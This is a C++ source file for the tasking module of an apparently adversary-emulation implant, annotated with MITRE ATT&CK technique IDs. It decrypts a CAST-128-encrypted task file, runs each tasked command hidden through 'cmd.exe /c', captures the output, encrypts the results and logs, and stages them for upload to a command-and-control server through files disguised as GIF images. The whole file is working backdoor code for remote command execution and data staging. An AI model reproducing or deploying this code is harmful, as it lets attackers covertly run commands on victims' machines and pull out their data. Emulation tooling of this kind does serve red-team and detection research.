#include "../include/tasking.h"

namespace tasking {

BOOL TaskingCallWrapper::CreateProcessWrapper(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes,
                                              LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags,
                                              LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo,
                                              LPPROCESS_INFORMATION lpProcessInformation) {
    return CreateProcess(lpApplicationName, lpCommandLine, lpProcessAttributes,
                         lpThreadAttributes, bInheritHandles, dwCreationFlags,
                         lpEnvironment, lpCurrentDirectory, lpStartupInfo,
                         lpProcessInformation);
}

DWORD TaskingCallWrapper::WaitForSingleObjectWrapper(HANDLE hHandle, DWORD dwMilliseconds) {
    return WaitForSingleObject(hHandle, dwMilliseconds);
}

WINBOOL TaskingCallWrapper::CloseHandleWrapper(HANDLE hObject) {
    return CloseHandle(hObject);
}

DWORD TaskingCallWrapper::GetLastErrorWrapper() {
    return GetLastError();
}

BOOL TaskingCallWrapper::ReadFileWrapper(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead,
                                         LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped) {
    return ReadFile(hFile, lpBuffer, nNumberOfBytesToRead, lpNumberOfBytesRead, lpOverlapped);
}

BOOL TaskingCallWrapper::CreatePipeWrapper(PHANDLE hReadPipe, PHANDLE hWritePipe, LPSECURITY_ATTRIBUTES lpPipeAttributes, DWORD nSize) {
    return CreatePipe(hReadPipe, hWritePipe, lpPipeAttributes, nSize);
}

BOOL TaskingCallWrapper::SetHandleInformationWrapper(HANDLE hObject, DWORD dwMask, DWORD dwFlags) {
    return SetHandleInformation(hObject, dwMask, dwFlags);
}

BOOL TaskingCallWrapper::GetExitCodeProcessWrapper(HANDLE hProcess, LPDWORD lpExitCode) {
    return GetExitCodeProcess(hProcess, lpExitCode);
}

// read and decrypt data from the task file
std::string ReadTaskFile() {
    std::string fileContents = std::string("");
    // get ownership of task file mutex
    util::logEncrypted(orchestrator::regLogPath, "[TASK] Attempting to get ownership of mutex: " + orchestrator::lpTasksName);
    Locker taskLock(orchestrator::mMutexMap.at(orchestrator::lpTasksName));
    util::logEncrypted(orchestrator::regLogPath, "[TASK] Got ownership of mutex");

    // read file contents, decrypt and store
    Sleep(500);
    util::logEncrypted(orchestrator::regLogPath, "[TASK] Checking orchestrator task file " + orchestrator::taskFilePath);

    // check if the file exists, return "" if not
    // REDUNDANT
    std::filesystem::path fsFilePath = orchestrator::taskFilePath;
    if (!std::filesystem::exists(fsFilePath)) {
        return fileContents;
    }

    // check if file has contents
    // this wouldn't be needed if reading the encrypted file would work properly
    std::vector<char> encContents = util::GetEncryptedFileContents(orchestrator::taskFilePath);
    if (encContents.empty()) {
        return fileContents;
    }

    // this should probably go before the contents check
    // redundant? don't really want to remove in case it breaks
    std::ifstream fileStream(orchestrator::taskFilePath, std::ios::binary);
    if (!(fileStream.good() && fileStream.is_open())) {
        return fileContents;
    }

    // read and decrypt the file
    // pretty much copied from /test/castDecrypt.cpp
    std::vector<char> ciphertext((std::istreambuf_iterator<char>(fileStream)), std::istreambuf_iterator<char>());
    int size = ciphertext.size();
    std::ostringstream stream;
    stream << "[TASK] Orchestrator task file size: " << size;
    util::logEncrypted(orchestrator::regLogPath, stream.str());

    try {
        fileContents = util::VCharToStr(enc_handler::Cast128Decrypt(ciphertext, orchestrator::key));
    } catch (const std::exception& e) {
        util::logEncrypted(orchestrator::errorLogPath, "[ERROR-TASK] Tasking ReadTaskFile encountered error reading task file " + orchestrator::taskFilePath + ": ");
        util::logEncrypted(orchestrator::errorLogPath, "[ERROR-TASK] " + std::string(e.what()));
        return fileContents;
    }

    return fileContents;
}

// take a line from a task file and put the contents into a task struct
int BuildTaskFromLine(std::string taskLine, task *orchTask) {
    std::vector<std::string> taskParts;
    std::string tmp;
    std::stringstream ss(taskLine);
    std::string logMsg;
    
    logMsg = "[TASK] Recieved task line: " + taskLine;
    util::logEncrypted(orchestrator::regLogPath, logMsg);

    // parse string delimited by |
    while(getline(ss, tmp, '|')) {
        //remove whitespace
        util::trim(tmp);
        taskParts.push_back(tmp);
    }

    // check if the task line had the correct amount of arguments
    if (taskParts.size() != 5) {
        return FAIL_TASKING_BAD_NUM_ARGUMENTS;
    }

    orchTask->task_id = taskParts[0];
    orchTask->task_filepath = taskParts[1];
    orchTask->task_config_filepath = taskParts[2];
    orchTask->task_result_filepath = taskParts[3];
    orchTask->task_log_filepath = taskParts[4];

    logMsg = "[TASK] Built task ID: " + taskParts[0];
    util::logEncrypted(orchestrator::regLogPath, logMsg);
    logMsg = "[TASK] Payload filepath: " + taskParts[1];
    util::logEncrypted(orchestrator::regLogPath, logMsg);
    logMsg = "[TASK] Config filepath: " + taskParts[2];
    util::logEncrypted(orchestrator::regLogPath, logMsg);
    logMsg = "[TASK] Result filepath: " + taskParts[3];
    util::logEncrypted(orchestrator::regLogPath, logMsg);
    logMsg = "[TASK] Log filepath: " + taskParts[4];
    util::logEncrypted(orchestrator::regLogPath, logMsg);

    return ERROR_SUCCESS;
}

// given the contents of a task config file, populate the given taskConfig struct
int BuildConfigFromContents(std::string taskConfigContents, taskConfig *orchTaskConfig) {
    // populate taskConfig with values from taskConfigContents
    orchTaskConfig->name = util::GetConfigValue("CONFIG", "name", taskConfigContents);
    orchTaskConfig->arg = util::GetConfigValue("CONFIG", "exe", taskConfigContents);

    // if field of taskConfig is blank, populate with default value
    if (orchTaskConfig->name == "") {
        orchTaskConfig->name = "cmd.exe";
    }

    if (orchTaskConfig->arg == "") {
        util::logEncrypted(orchestrator::errorLogPath, "[ERROR-TASK] Task config is missing argument");
        return FAIL_TASKING_BAD_TASK_ARG;
    }

    return ERROR_SUCCESS;
}

// given the contents of a task file, separate the contents into a vector of task lines
int GetTaskLinesFromContents(std::string fileContents, std::vector<std::string> *taskLines) {
    std::string tmp;
    std::stringstream ss(fileContents);

    // parse string delimited by new lines
    while(getline(ss, tmp)) {
        taskLines->push_back(tmp);
    }

    return ERROR_SUCCESS;
}

// create the result and log file as detailed in the task line, and add a header with the task ID
int CreateOutputFiles(task *orchTask, std::string resultFilePathStr, std::string logFilePathStr) {
    std::string log_msg = "Result file for TaskID: " + orchTask->task_id;
    util::encryptOutput(resultFilePathStr, log_msg);
    log_msg = "Log file for TaskID: " + orchTask->task_id;
    util::encryptOutput(logFilePathStr, log_msg);

    std::filesystem::path resultFilePath = resultFilePathStr;
    std::filesystem::path logFilePath = logFilePathStr;

    if (!std::filesystem::exists(resultFilePath) && !std::filesystem::exists(logFilePath)) {
        return FAIL_TASKING_BAD_OUTPUT_PATHS;
    }

    if (!std::filesystem::exists(resultFilePath)) {
        return FAIL_TASKING_BAD_RESULT_PATH;
    }

    if (!std::filesystem::exists(logFilePath)) {
        return FAIL_TASKING_BAD_LOG_PATH;
    }

    return ERROR_SUCCESS;
}

/*
 * SpawnProcess:
 *      About:
 *          Create a new process with CreateProcess.
 *          The new process will use cmd.exe /c to start.
 *          The argument from the task config file will be added to that, and
 *          then passed to CreateProcess to spawn the new process.
 *      Artifacts:
 *          Spawns a new process with cmd.exe.
 *      MITRE ATT&CK Tecnhiques:
 *          T1059.003: Command and Scripting Interpreter: Windows Command Shell
 *          T1106: Native API
 *      Result:
 *      	Returns ERROR_SUCCESS if successful, returns a failure code if not.
 *          If successful, cmd.exe will be launched running the desired command.     
 */
int SpawnProcess(TaskingCallWrapperInterface* t_call_wrapper, taskConfig *orchTaskConfig, HANDLE h_output_pipe, PROCESS_INFORMATION* pi) {
    STARTUPINFOA si;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = h_output_pipe;
    si.hStdError = h_output_pipe;

    std::string commandLine = "cmd.exe /c " + orchTaskConfig->arg;
    LPSTR cmdline = const_cast<LPSTR>(commandLine.c_str());

    // passing NULL as lpApplicationName will execute from cmd
    if (!t_call_wrapper->CreateProcessWrapper( NULL,
                                               cmdline,
                                               NULL,
                                               NULL,
                                               TRUE,
                                               CREATE_NO_WINDOW,
                                               NULL,
                                               NULL,
                                               &si,
                                               pi))
    {
        util::logEncrypted(orchestrator::errorLogPath, "[ERROR-TASK] CreateProcessA failed. GetLastError: " + t_call_wrapper->GetLastErrorWrapper());
        return FAIL_TASKING_CREATEPROCESS_FAIL;
    }

    std::ostringstream stream;
    stream << "[TASK] pi.hProcess: " << pi->hProcess << " pi.hThread: " << pi->hThread;
    util::logEncrypted(orchestrator::regLogPath, stream.str());

    return ERROR_SUCCESS;
}

// Get process output, wait for process to finish or timeout, and close process handles.
std::vector<char> GetProcessOutputAndCleanupTaskProcess(
    TaskingCallWrapperInterface* t_call_wrapper,
    HANDLE h_pipe_rd, 
    PROCESS_INFORMATION* pi,
    DWORD timeout_seconds,
    DWORD* error_code,
    std::string logFilePathStr,
    std::string taskID
) {
    std::vector<char> v_output;
    DWORD exit_code;
    BOOL result;
    std::string log_msg;
    char response_buffer[PIPE_READ_BUFFER_SIZE];
    DWORD num_bytes_read = 0;
    DWORD total_bytes_read = 0;
    DWORD error;
    std::string msg;

    size_t total_time_waited = 0;
    size_t wait_chunk = 100;
    DWORD wait_limit_ms = timeout_seconds * 1000;
    BOOL finished = FALSE;
    do {
        DWORD wait_result = t_call_wrapper->WaitForSingleObjectWrapper(pi->hProcess, wait_chunk);
        total_time_waited += wait_chunk;

        if (wait_result == WAIT_OBJECT_0) {
            // Process finished. Grab exit code
            finished = TRUE;

            if (!t_call_wrapper->GetExitCodeProcessWrapper(pi->hProcess, &exit_code)) {
                *error_code = t_call_wrapper->GetLastErrorWrapper();
                log_msg = "";
                log_msg = "Failed to get process exit code. Error code: " + std::to_string(*error_code);
                util::encryptOutput(logFilePathStr, log_msg);
                msg = "";
                msg = "[TASK#" + taskID;
                msg = msg + "] " + log_msg;
                util::logEncrypted(orchestrator::regLogPath, msg);
            } else {
                log_msg = "";
                log_msg = "Process exited with exit code: " + std::to_string(exit_code);
                util::encryptOutput(logFilePathStr, log_msg);
                msg = "";
                msg = "[TASK#" + taskID;
                msg = msg + "] " + log_msg;
                util::logEncrypted(orchestrator::regLogPath, msg);
            }
        } else if (wait_result == WAIT_FAILED) {
            *error_code = t_call_wrapper->GetLastErrorWrapper();
            log_msg = "";
            log_msg = "Failed to wait for process. Error code: " + std::to_string(*error_code);
            util::encryptOutput(logFilePathStr, log_msg);
            msg = "";
            msg = "[TASK#" + taskID;
            msg = msg + "] " + log_msg;
            util::logEncrypted(orchestrator::regLogPath, msg);
            break;
        }

        // Process either finished or this current wait round elapsed. Read some output to free up buffers if needed.
        while(TRUE) {
            DWORD available = 0;

            // check if we have data available in the pipe
            if (!PeekNamedPipe(h_pipe_rd, NULL, 0, NULL, &available, NULL)) { // todo wrap this
                break;
            }
            if (!available) {
                break;
            }
            result = t_call_wrapper->ReadFileWrapper(
                h_pipe_rd,
                response_buffer,
                PIPE_READ_BUFFER_SIZE,
                &num_bytes_read,
                NULL
            );

            total_bytes_read += num_bytes_read;
            if (num_bytes_read > 0) {
                v_output.insert(v_output.end(), response_buffer, response_buffer + num_bytes_read);
            }
            if (!result) {
                error = t_call_wrapper->GetLastErrorWrapper();
                if (error == ERROR_BROKEN_PIPE) {
                    // End of pipe. Normal flow.
                    break;
                } else if (error != ERROR_MORE_DATA) {
                    *error_code = error;
                    log_msg = "";
                    log_msg = "Failed to read from output pipe. Error code: " + std::to_string(*error_code);
                    util::encryptOutput(logFilePathStr, log_msg);
                    msg = "";
                    msg = "[TASK#" + taskID;
                    msg = msg + "] " + log_msg;
                    util::logEncrypted(orchestrator::regLogPath, msg);
                    return v_output;
                }
                
            }
        }

        if (total_time_waited >= wait_limit_ms) {
            log_msg = "";
            log_msg = "Process timed out.";
            util::encryptOutput(logFilePathStr, log_msg);
            msg = "";
            msg = "[TASK#" + taskID;
            msg = msg + "] " + log_msg;
            util::logEncrypted(orchestrator::regLogPath, msg);
            *error_code = FAIL_TASKING_TIMEOUT_REACHED;
            finished = TRUE;
        }
    } while (!finished);
    t_call_wrapper->CloseHandleWrapper(pi->hProcess);
    t_call_wrapper->CloseHandleWrapper(pi->hThread);

    log_msg = "";
    log_msg = "Received " + std::to_string(total_bytes_read) + " total output bytes from process.";
    util::encryptOutput(logFilePathStr, log_msg);
    msg = "";
    msg = "[TASK#" + taskID;
    msg = msg + "] " + log_msg;
    util::logEncrypted(orchestrator::regLogPath, msg);
    *error_code = ERROR_SUCCESS;
    return v_output;
}

/*
 * ExecuteTask:
 *      About:
 *          Perform steps to execute a task. Create and configure a pipe to communicate
 *          with the process we'll create. Extract information from the task config file.
 *          Spawn the process for this task, and get its output.
 *      MITRE ATT&CK Tecnhiques:
 *          T1059.003: Command and Scripting Interpreter: Windows Command Shell
 *          T1106: Native API
 *      Result:
 *      	Returns ERROR_SUCCESS if successful, returns a failure code if not.
 */
int ExecuteTask(TaskingCallWrapperInterface* t_call_wrapper, task *orchTask, std::string logFilePathStr, std::vector<char>* output) {
    int retVal;
    std::string log_msg;
    std::string msg;
    DWORD error_code = 0;

    // Allow our pipe handle to be inherited
    SECURITY_ATTRIBUTES pipe_sa; 
    pipe_sa.nLength = sizeof(pipe_sa);
    pipe_sa.lpSecurityDescriptor = NULL;
    pipe_sa.bInheritHandle = TRUE;

    // Create named pipe for retrieve output
    HANDLE h_pipe_output_rd = NULL;
    HANDLE h_pipe_output_wr = NULL;
    if (!t_call_wrapper->CreatePipeWrapper(&h_pipe_output_rd, &h_pipe_output_wr, &pipe_sa, 0)) {
        error_code = t_call_wrapper->GetLastErrorWrapper();
        log_msg = "Failed to create pipe for process stdout. Error code: " + std::to_string(error_code);
        util::encryptOutput(logFilePathStr, log_msg);
        msg = "[TASK#" + orchTask->task_id;
        msg = msg + "] " + log_msg;
        util::logEncrypted(orchestrator::errorLogPath, msg);
        return FAIL_TASKING_CREATE_PIPE;
    }

    // Set pipe handle
    if (!t_call_wrapper->SetHandleInformationWrapper(h_pipe_output_rd, HANDLE_FLAG_INHERIT, 0)) {
        error_code = t_call_wrapper->GetLastErrorWrapper();
        t_call_wrapper->CloseHandleWrapper(h_pipe_output_wr);
        t_call_wrapper->CloseHandleWrapper(h_pipe_output_rd);
        log_msg = "Failed to set handle for stdout pipe. Error code: " + std::to_string(error_code);
        util::encryptOutput(logFilePathStr, log_msg);
        msg = "[TASK#" + orchTask->task_id;
        msg = msg + "] " + log_msg;
        util::logEncrypted(orchestrator::errorLogPath, msg);
        return FAIL_TASKING_SET_PIPE_HANDLE;
    }

    taskConfig orchTaskConfig;
    std::string configContents;

    // for getting encrypted task config contents
    std::vector<char> encContents = util::GetEncryptedFileContents(orchTask->task_config_filepath);
    if (encContents.empty()) {
        configContents = "";
    } else {
        configContents = util::VCharToStr(enc_handler::Cast128Decrypt(encContents, orchestrator::key));
    }

    util::logEncrypted(orchestrator::regLogPath, "[TASK] Task config:\n" + configContents);

    // parse the data from the task config file and populate a taskConfig struct with it
    retVal = BuildConfigFromContents(configContents, &orchTaskConfig);
    if (retVal != ERROR_SUCCESS) {
        t_call_wrapper->CloseHandleWrapper(h_pipe_output_rd);
        t_call_wrapper->CloseHandleWrapper(h_pipe_output_wr); 
        log_msg = "Failed to extract config data from " + orchTask->task_config_filepath;
        util::encryptOutput(logFilePathStr, log_msg);
        msg = "[TASK#" + orchTask->task_id;
        msg = msg + "] " + log_msg;
        util::logEncrypted(orchestrator::errorLogPath, msg);
    }

    // Create process, output to pipe we created
    PROCESS_INFORMATION pi; // for created process
    retVal = SpawnProcess(t_call_wrapper, &orchTaskConfig, h_pipe_output_wr, &pi);
    if (retVal != ERROR_SUCCESS) {
        error_code = t_call_wrapper->GetLastErrorWrapper();
        t_call_wrapper->CloseHandleWrapper(h_pipe_output_rd);
        t_call_wrapper->CloseHandleWrapper(h_pipe_output_wr); 
        log_msg = "Failed to create process. Error code: " + std::to_string(error_code);
        util::encryptOutput(logFilePathStr, log_msg);
        msg = "[TASK#" + orchTask->task_id;
        msg = msg + "] " + log_msg;
        util::logEncrypted(orchestrator::errorLogPath, msg);
        return retVal;
    }

    log_msg = "Created process with ID " + std::to_string(pi.dwProcessId) + " and command \"" + std::string(orchTaskConfig.arg) + "\"";
    util::encryptOutput(logFilePathStr, log_msg);
    msg = "[TASK#" + orchTask->task_id;
    msg = msg + "] " + log_msg;
    util::logEncrypted(orchestrator::regLogPath, msg);

    // Get process output and wait for 300 seconds for it to finish
    *output = GetProcessOutputAndCleanupTaskProcess(t_call_wrapper, h_pipe_output_rd, &pi, 300, &error_code, logFilePathStr, orchTask->task_id);
    t_call_wrapper->CloseHandleWrapper(h_pipe_output_wr);
    t_call_wrapper->CloseHandleWrapper(h_pipe_output_rd);

    return error_code;
}

// add entries to the send file (traverse.gif) to upload the task result and log file to the C2
// task id | num files uploaded (1) | file path | UUID (in config)
void AppendFilesToSend(task *orchTask) {
    // get ownership of the file send mutex
    Locker sendLock(orchestrator::mMutexMap.at(orchestrator::lpFileUploadName));

    std::string logMsg = "[TASK] Outputting to send file: " + orchestrator::sendFilePath + "\n";

    // add entries for both result and log file to send file
    std::ostringstream stream;
    stream << orchTask->task_id << " | 1 | " << orchTask->task_result_filepath << " | " << orchestrator::uuid << "\n"
           << orchTask->task_id << " | 1 | " << orchTask->task_log_filepath << " | " << orchestrator::uuid << "\n";
    util::encryptOutput(orchestrator::sendFilePath, stream.str());
    util::logEncrypted(orchestrator::regLogPath, logMsg + stream.str());

}

// Main tasking loop. Check the task file for entries. If there are entries,
// extract that information into a struct and execute the task.
int DoTasking(TaskingCallWrapperInterface* t_call_wrapper) {
    int retVal;
    std::string fileContents = std::string("");
    std::vector<std::string> taskLines;
    std::vector<char> output;
    task orchTask;
    bool canReadTaskFile = TRUE;

    try {
        fileContents = ReadTaskFile();
    } catch (const std::exception& e) {
        util::logEncrypted(orchestrator::errorLogPath, "[ERROR-TASK] Tasking encountered error reading task file " + orchestrator::taskFilePath + ": ");
        util::logEncrypted(orchestrator::errorLogPath, "[ERROR-TASK] " + std::string(e.what()));
        canReadTaskFile = FALSE;
    }    

    // if there are no contents in the file, log that, sleep for 5 seconds, and return
    if (fileContents == "") {
        if (canReadTaskFile) {
            util::logEncrypted(orchestrator::regLogPath, "[WARN-TASK] Tasking file empty");
        } else {
            util::logEncrypted(orchestrator::regLogPath, "[WARN-TASK] Unable to read tasking file");
        }
        
        util::logEncrypted(orchestrator::regLogPath, "[TASK] Releasing mutex, sleeping...");
        Sleep(5000);
        return ERROR_SUCCESS;
    }

    util::logEncrypted(orchestrator::regLogPath, "[TASK] Found contents in task file");

    // convert file contents to task line
    retVal = GetTaskLinesFromContents(fileContents, &taskLines);
    if (retVal != ERROR_SUCCESS) {
        return retVal;
    }

    // convert task line to task struct and execute
    for (std::string& taskLine: taskLines) {
        retVal = BuildTaskFromLine(taskLine, &orchTask);
        if (retVal != ERROR_SUCCESS) {
            util::logEncrypted(orchestrator::regLogPath, "[WARN-TASK] Unable to build task from line, error: " + retVal);
            continue;
        }

        // create output files
        retVal = CreateOutputFiles(&orchTask, orchTask.task_result_filepath, orchTask.task_log_filepath);

        if (retVal != ERROR_SUCCESS) {
            if (retVal == FAIL_TASKING_BAD_RESULT_PATH) {
                util::logEncrypted(orchestrator::errorLogPath, "[ERROR-TASK] Bad path for result file.");
            }
            if (retVal == FAIL_TASKING_BAD_LOG_PATH) {
                util::logEncrypted(orchestrator::errorLogPath, "[ERROR-TASK] Bad path for log file.");
            }
            if (retVal == FAIL_TASKING_BAD_OUTPUT_PATHS) {
                util::logEncrypted(orchestrator::errorLogPath, "[ERROR-TASK] Bad paths for both result and log file.");
            }
        }

        // perform task
        util::logEncrypted(orchestrator::regLogPath, "[TASK] Task successfully built");
        std::string msg = "[TASK] Executing task ID: " + orchTask.task_id;
        util::logEncrypted(orchestrator::regLogPath, msg);
        retVal = ExecuteTask(t_call_wrapper, &orchTask, orchTask.task_log_filepath, &output);
        if (retVal != ERROR_SUCCESS) {
            util::logEncrypted(orchestrator::errorLogPath, "[ERROR-TASK] Execution failed: " + retVal);
            continue;
        }

        msg = "[TASK] Completed execution of task ID: " + orchTask.task_id;
        util::logEncrypted(orchestrator::regLogPath, msg);

        std::string outStr = "";
        for (char& ch: output) {
            outStr += ch;
        }
        util::encryptOutput(orchTask.task_result_filepath, outStr);
        util::logEncrypted(orchestrator::regLogPath, outStr);

        AppendFilesToSend(&orchTask);
    }

    // clear tasks in file
    std::ofstream ofs;
    ofs.open(orchestrator::taskFilePath, std::ofstream::out | std::ofstream::trunc);
    ofs.close();

    // complete execution and sleep for 5 seconds
    util::logEncrypted(orchestrator::regLogPath, "[TASK] Releasing mutex, sleeping");

    return ERROR_SUCCESS;
}

// Perform tasking. Check task file every 5 seconds. If there is a task, perform it.
// Upon task completion, list files to send to C2 in send file (jaxsetup.gif)
int TaskingManager(TaskingCallWrapperInterface* t_call_wrapper) {
    int retVal;

    Sleep(10000); // give the injection portion 10 seconds to inject comms lib before starting tasking

    while(true) {
        if (orchestrator::commsActiveFlag) {
            util::logEncrypted(orchestrator::regLogPath, "[TASK] Comms lib active, performing tasking checks");
            retVal = DoTasking(t_call_wrapper);
            if (retVal != ERROR_SUCCESS) {
                util::logEncrypted(orchestrator::errorLogPath, "[ERROR-TASK] Encountered error when performing tasking: " + retVal);
            }
        } else {
            util::logEncrypted(orchestrator::regLogPath, "[TASK] Comms lib inactive, sleeping");
        }
        Sleep(5000);
    }

    return ERROR_SUCCESS;
}

} // namespace tasking
